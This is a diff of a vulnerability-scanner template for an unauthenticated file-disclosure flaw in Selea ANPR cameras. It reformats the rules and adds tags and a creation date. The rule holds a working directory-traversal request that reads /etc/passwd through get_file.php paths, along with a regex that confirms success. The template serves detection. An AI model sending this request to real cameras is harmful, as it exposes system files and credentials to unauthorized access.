@@ -7,13 +7,15 @@ info:
   description: |
     The ANPR camera suffers from an unauthenticated arbitrary file disclosure vulnerability. Input passed through the Download Archive in Storage page using get_file.php script is not properly verified before being used to download files. This can be exploited to disclose the contents of arbitrary and sensitive files via directory traversal attacks and aid the attacker to disclose clear-text credentials resulting in authentication bypass.
     app="Selea-ANPR-Camera"
-  reference: 
+  reference:
     - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5616.php
+  tags: selea,targa,camera,lfi,unauthorized,directory-traversal
+  created: 2023/05/26
 
 rules:
-    r0:
-        request:
-            method: GET
-            path: /CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
-        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
-expression: r0() 
+  r0:
+    request:
+      method: GET
+      path: /CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0()
